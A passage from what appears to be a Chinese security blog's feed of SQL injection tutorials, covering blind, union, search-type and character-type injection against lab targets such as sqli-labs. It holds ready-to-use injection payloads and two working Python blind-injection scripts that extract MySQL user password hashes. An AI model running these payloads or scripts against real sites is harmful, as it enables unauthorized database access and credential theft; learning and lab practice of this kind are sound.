返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的<strong>时间差</strong>来判断注入的语句是否正确。<br>时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的<strong>延迟特性</strong>来判断注入语句是否执行成功。</p><p><strong>什么情况下考虑使用时间盲注</strong></p><pre><code>1. 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样2. 不会回显注入语句执行结果，故无法使用UNION注入3. 不会显示报错信息，故无法使用报错注入4. 符合盲注的特征，但不属于布尔型盲注</code></pre><p><strong>常用函数</strong><br>sleep(n)：将程序挂起一段时间 n为n秒。<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。</p><p>使用sleep()函数和if()函数：<code>and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+</code>   如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。</p><p><strong>流程：</strong><br>①猜测数据库名称长度：<br>输入：</p><ul><li>id&#x3D;1’ and If(length(database()) &gt; 1,1,sleep(5))–+</li></ul><p>用时：&lt;1s，数据库名称长度&gt;1<br>…<br>输入：</p><ul><li>id&#x3D;1’ and If(length(database()) &gt;8 ,1,sleep(5))–+</li></ul><p>用时：5s，数据库名称长度&#x3D;8<br>得出结论：数据库名称长度等于8个字符。<br>②猜测数据库名称的一个字符：<br>输入：</p><ul><li>id&#x3D;1’ and If(ascii(substr(database(),1,1))&#x3D;97,sleep(5),1)–+</li></ul><p>用时：&lt;1s<br>…<br>输入：</p><ul><li>id&#x3D;1’ and If(ascii(substr(database(),1,1))&#x3D;115,sleep(5),1)–+</li></ul><p>用时：5s<br>得出结论：<br>数据库名称的第一个字符是小写字母s。<br>改变substr的值，以此类推第n个字母。最后猜出数据库名称。</p><pre><code>③猜测数据库表名：先猜测长度，与上面内容相似。④猜测数据库字段：先猜测长度，与上面内容相似。⑤猜测字段内容：先猜测长度，与上面内容相似。</code></pre><hr><p><strong>逻辑判断</strong>  </p><p>基于布尔  有数据库输出判断</p><p>猜<strong>数据库长度</strong>，正确则有回显</p><blockquote><p>?id&#x3D;1 and length(database（）)&#x3D;1xx  </p></blockquote><p>猜位数，<strong>第一位</strong>是什么，正确则有回显</p><blockquote><p>?id&#x3D;1 and substr(database（），1,1)&#x3D; ‘x’  </p></blockquote><p><strong>延时判断</strong><br>    ?id&#x3D;1and if(1&#x3D;1,sleep(5),0)如果1&#x3D;1，则延迟5s ,不成立返回0<br>    ?id&#x3D;1and if(1&#x3D;1, length ( database () )&#x3D;x ,sleep(5)) 如果长度猜对就回显，不对就延时</p><p><strong>报错回显</strong><br>    ？id &#x3D; 2 and updatexml( 2,concat ( 0x7e, ( select database() ) , 0x7e) , 1) 报错并爆出数据库名<br>    ？id &#x3D; 2 and updatexml( 2,concat ( 0x7e, ( select database() ) , 0x7e) , 1) </p><p><strong>盲注脚本：</strong></p><p>get请求盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 只需要修改url 和 两个payload即可</span></span><br><span class="line"><span class="comment"># 目标网址（不带参数）</span></span><br><span class="line">url = <span class="string">&quot;http://3534c6c2bffd4225bf3409ae9a2ec278.app.mituan.zone/Less-5/&quot;</span></span><br><span class="line"><span class="comment"># 猜解长度使用的payload</span></span><br><span class="line">payload_len = <span class="string">&quot;&quot;&quot;?id=1&#x27; and length(</span></span><br><span class="line"><span class="string">                (select group_concat(user,password)</span></span><br><span class="line"><span class="string">                    from mysql.user)</span></span><br><span class="line"><span class="string">                ) &lt; &#123;n&#125; -- a&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 枚举字符使用的payload</span></span><br><span class="line">payload_str = <span class="string">&quot;&quot;&quot;?id=1&#x27; and ascii(</span></span><br><span class="line"><span class="string">                substr(</span></span><br><span class="line"><span class="string">                (select group_concat(user,password)</span></span><br><span class="line"><span class="string">                from mysql.user)</span></span><br><span class="line"><span class="string">                ,&#123;n&#125;,1)</span></span><br><span class="line"><span class="string">                ) = &#123;r&#125; -- a&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLength</span>(<span class="params">url, payload</span>):</span><br><span class="line">    length = <span class="number">1</span>  <span class="comment"># 初始测试长度为1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = requests.get(url= url+payload_len.<span class="built_in">format</span>(n= length))</span><br><span class="line">        <span class="comment"># 页面中出现此内容则表示成功</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;测试长度完成，长度为：&#x27;</span>, length,)</span><br><span class="line">            <span class="keyword">return</span> length;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正在测试长度：&#x27;</span>,length)</span><br><span class="line">            length += <span class="number">1</span>  <span class="comment"># 测试长度递增</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStr</span>(<span class="params">url, payload, length</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 初始表名/库名为空</span></span><br><span class="line">    <span class="comment"># 第一层循环，截取每一个字符</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 第二层循环，枚举截取字符的每一种可能性</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">126</span>):</span><br><span class="line">            response = requests.get(url= url+payload_str.<span class="built_in">format</span>(n= l, r= n))</span><br><span class="line">            <span class="comment"># 页面中出现此内容则表示成功</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">str</span>+= <span class="built_in">chr</span>(n)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;第&#x27;</span>, l, <span class="string">&#x27;个字符猜解成功：&#x27;</span>, <span class="built_in">str</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始猜解</span></span><br><span class="line">length = getLength(url, payload_len)</span><br><span class="line">getStr(url, payload_str, length)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>post请求盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站路径</span></span><br><span class="line">url = <span class="string">&quot;http://7eb82265178a435aa86d6728e7b1e08a.app.mituan.zone/Less-13/&quot;</span></span><br><span class="line"><span class="comment"># 判断长度的payload</span></span><br><span class="line">payload_len = <span class="string">&quot;&quot;&quot;a&#x27;) or length(</span></span><br><span class="line"><span class="string">                    (select group_concat(user,password) </span></span><br><span class="line"><span class="string">                     from mysql.user)</span></span><br><span class="line"><span class="string">                )&gt;&#123;n&#125; -- a&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 枚举字符的payload</span></span><br><span class="line">payload_str = <span class="string">&quot;&quot;&quot;a&#x27;) or ascii(</span></span><br><span class="line"><span class="string">                    substr(</span></span><br><span class="line"><span class="string">                        (select group_concat(user,password)</span></span><br><span class="line"><span class="string">                        from mysql.user)</span></span><br><span class="line"><span class="string">                    ,&#123;l&#125;,1)</span></span><br><span class="line"><span class="string">                )=&#123;n&#125; -- a&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># post请求参数</span></span><br><span class="line">data= &#123;</span><br><span class="line">    <span class="string">&quot;uname&quot;</span> : <span class="string">&quot;a&#x27;) or 1 -- a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span> : <span class="string">&quot;Submit&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLen</span>(<span class="params">payload_len</span>):</span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 修改请求参数</span></span><br><span class="line">        data[<span class="string">&quot;uname&quot;</span>] = payload_len.<span class="built_in">format</span>(n = length)</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># 出现此内容为登录成功</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正在测试长度：&#x27;</span>, length)</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;测试成功，长度为：&#x27;</span>, length)</span><br><span class="line">            <span class="keyword">return</span> length;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStr</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 从第一个字符开始截取</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 枚举字符的每一种可能性</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">            data[<span class="string">&quot;uname&quot;</span>] = payload_str.<span class="built_in">format</span>(l=l, n=n)</span><br><span class="line">            response = requests.post(url=url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">str</span> += <span class="built_in">chr</span>(n)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;第&#x27;</span>, l, <span class="string">&#x27;个字符枚举成功：&#x27;</span>,<span class="built_in">str</span> )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">length = getLen(payload_len)</span><br><span class="line">getStr(length)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考文章：<br><a href="https://blog.csdn.net/weixin_45146120/article/details/100104131">https://blog.csdn.net/weixin_45146120/article/details/100104131</a><br><a href="https://blog.csdn.net/wangyuxiang946/article/details/123486880">https://blog.csdn.net/wangyuxiang946/article/details/123486880</a><br><a href="https://blog.csdn.net/c_programj/article/details/115557295">https://blog.csdn.net/c_programj/article/details/115557295</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入-base64编码注入</title>
+      <link href="/2023/03/29/SQL%E6%B3%A8%E5%85%A5-base64%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/03/29/SQL%E6%B3%A8%E5%85%A5-base64%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>——鲁迅曾经说过：“有数据库的地方就有SQL注入”</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入-搜索型注入</title>
+      <link href="/2023/03/29/SQL%E6%B3%A8%E5%85%A5-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/03/29/SQL%E6%B3%A8%E5%85%A5-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>——鲁迅曾经说过：“有数据库的地方就有SQL注入”</p><h3 id="搜索型注入简介与原理"><a href="#搜索型注入简介与原理" class="headerlink" title="搜索型注入简介与原理"></a>搜索型注入简介与原理</h3><p><strong>简介</strong><br>一些网站为了方便用户查找网站的资源，对用户提供了搜索功能，因为是搜索功能，有些网站可能在编码时会忽略对参数（变量）的过滤，而这样的漏洞在互联网中普遍存在。<br>其中又分为post和get，get型一般是在网站上的搜索，而post则是用户名登录中常见的，可以从form表单的<code>method=&quot;get&quot;</code>属性中来区分书get还是post，搜索型注入又称文本框注入。</p><p><strong>原理</strong><br><code>$sql = &quot;select * from user where password like &#39; %$pwd% &#39; order by password&quot; </code></p><p>用户输入 $pwd 查询响应的password</p><blockquote><p>‘and 1&#x3D;1 and ‘%’ &#x3D;’</p></blockquote><p>拼接后变为：</p><p><code>select * from user where password like &#39; % &#39;and 1=1 and &#39;%&#39; =&#39;%&#39; order by password</code></p><p>所以存在SQL注入</p><h4 id="搜索型注入判断方法"><a href="#搜索型注入判断方法" class="headerlink" title="搜索型注入判断方法"></a>搜索型注入判断方法</h4><ul><li><p>1、搜索<code>keywords‘ </code>，如果出错的话，有90%的可能性存在漏洞；</p></li><li><p>2 搜索<code>keywords%</code>，如果同样出错的话，就有95%的可能性存在漏洞；</p></li><li><p>3 搜索 <code>keywords% &#39;and 1=1 and &#39;%&#39;=&#39;</code>（这个语句的功能就相当于普通SQL注入的 and 1&#x3D;1）看返回的情况</p></li><li><p>4 搜索 <code>keywords% &#39;and 1=2 and &#39;%&#39;=&#39; </code>（这个语句的功能就相当于普通SQL注入的 and 1&#x3D;2）看返回的情况</p></li><li><p>5 根据两次的返回情况来判断是不是搜索型文本框注入了</p></li></ul><p>下面这几种语句都可以:</p><p><code>&#39;and 1=1 and &#39;%&#39;=&#39;</code></p><p><code>%&#39; and 1=1--&#39;</code></p><p><code>%&#39; and 1=1 and &#39;%&#39;=&#39;</code></p><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p>首先我们知道了测试的源码</p><blockquote><p><code> $query=&quot;select username,id,email from member where username like &#39;%$name%&#39;&quot;;</code></p></blockquote><p>1、我们可以输入<code>’ and 1=1 order by x#</code>通过order by x来确定字段数</p><p>输入<code>’ and 1=1 order by 3#</code>时返回了正常页面<br>而输入<code>’ and 1=1 order by 4#</code>时就回显了报错：<br>所以字段数（列）为3<br>2、然后输入<code>’ and 1=2 union select 1,2,3#</code>，回显了1、2、3：<br>3、证明1,2,3都可以回显。<br>输入<code>’ and 1=2 union select 1,2,(database())#</code>就可以爆出当前使用的数据库名xxx：<br>4、输入<code>’ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=‘数据库名xxx’# </code>，就得到了xxx数据库下的所有表名：<br>5、选出需要爆破的表，输入<code>’ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=‘member’#</code>，得到member表下的所有字段名：<br>6、然后输入<code>’ and 1=2 union select 1,2,pw from pikachu.member#</code>，就得到了字段pw的内容</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入-联合查询注入</title>
+      <link href="/2023/03/29/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/03/29/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>——鲁迅曾经说过：“有数据库的地方就有SQL注入”</p><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>  首先收集信息分析猜测数据库类型，根据不同的数据库类型选择不同的思路。</p><p>  <strong>以MySQL数据库为例：</strong><br>  database():当前网站使用的数据库<br>  user():当前用户<br>  version():<strong>当前MySQL版本</strong></p><hr><p>eg : mysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库，叫做：information_schema，而5.0以下的版本不存在。information_schema下面又包含了这几张表：schemata、tables、columns。这三张表依次分别存放着字段：(schema_name)、(table_name、table_schema)、(table_schema、table_name、column_name)，其次就是5.0以上都是多用户，5.0以下是单用户。<br>所以一旦判断出数据库版本在5.0以上，我们就可以根据information_schema数据库中的信息，进行数据爆破，获取任意表信息。</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[select](http://pu2lh35s.ia.aqlab.cn/index.php?id=1)</span><br></pre></td></tr></table></figure><p>根据信息收据到的可注入点的代码可以进行联合查询<br>黑盒：<br>首先找到可控变量：？ID&#x3D;xxx</p><p>1、order by xxx（猜列）</p><ul><li>2正常，3报错，所以是两列。</li></ul><p>3、select union 1,2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pu2lh35s.ia.aqlab.cn/index.php?id=1%20and%201=2%20union%20select%201,2</span><br></pre></td></tr></table></figure><p>爆出2</p><p>在第二个数插入想要查找的值对应代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,database()</span><br><span class="line">http://pu2lh35s.ia.aqlab.cn/index.php?id=1%20and%201=2%20union%20select%201,database()</span><br></pre></td></tr></table></figure><p>显示数据库名称 XXX</p><p>4、MySQL数据库版本大于5.0</p><p>爆出的数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=20 union select 1,database()#</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=20 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure><p>爆列字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=20 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure><p>爆字段对应的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=20 union select 1,group_concat(username,0x3a,password) from admin#</span><br></pre></td></tr></table></figure><hr>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入-字符型注入</title>
+      <link href="/2023/03/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/03/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>——鲁迅曾经说过：“有数据库的地方就有SQL注入”</p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p><strong>原理：</strong><br>执行数据库查询，并在回显点展示。<br>用户可以看到数据库查询出错时的错误语句，就可以观察报错语句分析出查询语句结构，从而构造特殊的payload进行注入，并从回显点中获取想要的信息。<br>(与报错注入不同在拥有回显点，报错注入没有回显点需要通过错误信息查看结果)<br><strong>注入方法：</strong><br>根据报错的sql语句信息，查看sql语句样子，继而构造注入语句<br>构造单引号‘、双引号“、括号)闭合查询语句，直到报错证明注入点存在<br>地址栏输入 # 这类的要用16进制编码（网页传输方便的编码）<br>如：’#’ %23 注释<br>‘- -‘注释 一般用 –+ 即 – 即 –%20<br>(空格) %20</p><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p><p>例如数字型语句：</p><blockquote><p>select * from table where id &#x3D;3</p></blockquote><p>则字符型如下：</p><blockquote><p>select * from table where name&#x3D;’admin’</p></blockquote><p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p><p>测试步骤：</p><p>（1） 加单引号：</p><blockquote><p>select * from table where name&#x3D;’admin’’</p></blockquote><p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p><p>（2） 加 ’and 1&#x3D;1 此时sql 语句为：</p><blockquote><p>select * from table where name&#x3D;’admin’ and 1&#x3D;1’ </p></blockquote><p>也无法进行注入，还需要通过注释符号将其绕过；</p><p>Mysql 有三种常用注释符：</p><p>– 注意，这种注释符后边有一个空格</p><p> #通过#进行注释</p><p>&#x2F;* *&#x2F; 注释掉符号内的内容</p><p>因此，构造语句为：</p><blockquote><p>select * from table where name &#x3D;’admin’ and 1&#x3D;1—’ </p></blockquote><p>可成功执行返回结果正确；</p><p>（3） 加and 1&#x3D;2— 此时sql语句为：</p><blockquote><p>select * from table where name&#x3D;’admin’ and 1&#x3D;2 –’<br>则会报错</p></blockquote><p>如果满足以上三点，可以判断该url为字符型注入。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入分类及产生条件</title>
+      <link href="/2023/03/28/SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB/"/>
+      <url>/2023/03/28/SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB/</url>
+      
+        <content type="html"><![CDATA[<p>——鲁迅曾经说过：“有数据库的地方就有SQL注入”</p><h3 id="一、SQL注入分类"><a href="#一、SQL注入分类" class="headerlink" title="一、SQL注入分类"></a>一、SQL注入分类</h3><h4 id="按数据类型分："><a href="#按数据类型分：" class="headerlink" title="按数据类型分："></a>按数据类型分：</h4><p><strong>1、数字类型</strong><br>后台语句可能为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id =  $_POST[&#x27;id&#x27;]</span><br><span class="line">select user,password from users where id = $id ;</span><br></pre></td></tr></table></figure><p><strong>2、字符类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id =  $_POST[&#x27;id&#x27;]</span><br><span class="line">select user,password from users where id =&#x27;$id&#x27; ; </span><br></pre></td></tr></table></figure><ul><li>数字类型直接将后台接收到的数据内容带到数据库中执行；字符型将接收到的内容添加引号直接带到数据库中执行</li><li>字符型注入需要考虑语句的闭合问题，而数字类型则不存在</li></ul><h3 id="按注入位置分"><a href="#按注入位置分" class="headerlink" title="按注入位置分"></a>按注入位置分</h3><p><strong>1、GET方式注入</strong><br>注入参数以get方式进行提交<br><strong>2、POST方式注入</strong><br>注入参数以post方式进行提交<br><strong>3、基于COOKIE的注入</strong><br>后台接收cookie内的参数，在http的cookie字段存在注入漏洞<br><strong>4、基于http头部的注入</strong><br>后台会接收referer或user-agent字段的参数，http头部中的referer、user-agent字段中存在注入漏洞</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><strong>1、基于布尔的盲注</strong><br><strong>特点：</strong> 网站页面在输入条件为TRUE和FALSE的情况下回显示不同，但页面中没有输出。此时需要在SQL语句后添加提哦啊见判断<br>猜解思路：</p><ul><li>猜数据库：先构造条件判断当前数据库的名字长度，然后逐字猜解数据库名。</li><li>猜数据表：先构造条件判断数据表的数量，然后猜解，先猜长度然后猜表名。</li><li>猜解数据列：指定数据库中的指定表进行猜解字段，先猜字段数目，再猜字段</li><li>猜解内容：指定数据列，先查询数据的条数，然后猜内容</li></ul><p><strong>2、基于时间的盲注</strong><br><strong>特点：</strong> 网站页面在输入条件为真和为假返回的页面相同，但通过延时函数构造语句，可通过页面响应时间的不同判断是否存在注入<br>猜解思路：</p><ul><li>类似基于布尔的盲注，只是将条件为真转换为延时响应</li></ul><p><strong>常用函数</strong></p><ul><li><p>if(condition,A,B):若condition返回真则执行A，假则执行B</p></li><li><p>substr(str,A,B):字符串截取函数，截取str字符串从A位置开始，截取B个字符</p></li><li><p>left(str,A):类似字符串截取函数，返回str字符串从左往右数的A个字符</p></li><li><p>count(A):计算A的数目，常用与查询数据表、数据列、数据内容的条数</p></li><li><p>len(A):计算A的长度，常用于返回数据库名、数据表名、数据列名的长度</p></li><li><p>ascii(A):返回A的ascii码，当逐字猜解限制单引号的输入时，可以通过查询ascii码来绕过</p></li></ul><h3 id="基于UNION的注入"><a href="#基于UNION的注入" class="headerlink" title="基于UNION的注入"></a>基于UNION的注入</h3><p><strong>联合注入</strong><br>首先通过order by 进行判断查询参数的数目，然后构造union查询，查看回显。有时需要将前面参数名修改为假的参数。如id&#x3D;-10’ union select 1,2，查找页面中1和2的位置，在页面中显示的数字的地方构造查询的内容。<br>若页面无回显但报错可以尝试报错注入</p><h3 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h3><p><strong>常用函数</strong></p><blockquote><p>updatexml(1,concat(‘<del>‘,SQL语句,’</del>‘),1)</p></blockquote><blockquote><p>extractvalue(1,concat(‘~’,(SQL语句)))</p></blockquote><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入的原理即为数据库的编码与后台程序的编码不一致，数据库中一个字符占两个字节，而后台程序为一个字符占一个字节，当后台程序对输入的单引号的字符进行转义时，通过在这些转义的字符前输入%bf然后将%bf’带入后台程序时会转义为%bf’，此时带入数据库中，数据库将%bf\看作是一个中文字符从而使用单引号将SQL语句进行闭合。</p><h3 id="基于base64加密注入"><a href="#基于base64加密注入" class="headerlink" title="基于base64加密注入"></a>基于base64加密注入</h3><p>后台程序在接收用户输入的参数后先进行base64解码然后带入到SQL语句中执行。所以这种类型的注入首先需要将payload进行base64加密</p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>当搜索关键字时，后台SQL语句可能为：<code>select username from users where id=&#39;%$id%&#39;</code>，此时构造闭合语句时需要考虑%的闭合</p><h3 id="二、SQL注入的产生条件"><a href="#二、SQL注入的产生条件" class="headerlink" 